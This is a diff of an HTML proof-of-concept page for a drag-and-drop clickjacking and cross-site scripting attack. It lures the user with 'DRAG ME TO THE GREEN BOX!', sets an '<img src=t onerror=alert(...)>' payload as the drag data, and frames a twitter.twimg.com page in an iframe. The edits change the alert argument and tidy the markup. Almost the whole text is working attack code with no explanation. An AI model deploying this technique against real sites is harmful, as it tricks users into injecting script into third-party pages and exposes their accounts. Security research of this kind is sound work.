@@ -23,9 +23,6 @@
     height: 50px;
     left: 45%;
     top: 50%;
-        h3{
-          color:#1da1f2;
-        }
       }
       div.spoofing{
     text-align: center;
@@ -46,8 +43,9 @@
     </style>
   </head>
   <body>
-   <center><div draggable="true" ondragstart='event.dataTransfer.setData("text/plain", "<img src=t onerror=alert(xss);>")'><h3>DRAG ME TO THE GREEN BOX!</h3></div></center>
+   <center><div draggable="true" ondragstart='event.dataTransfer.setData("text/plain", "<img src=t onerror=alert(X);>")'><h3>DRAG ME TO THE GREEN BOX!</h3></div></center>
     <iframe style="height:0"></iframe>
+    <span class="one">1</span><span class="tow">2</span>
         <iframe id="cj" src="https://twitter.twimg.com/html"></iframe>
 
     
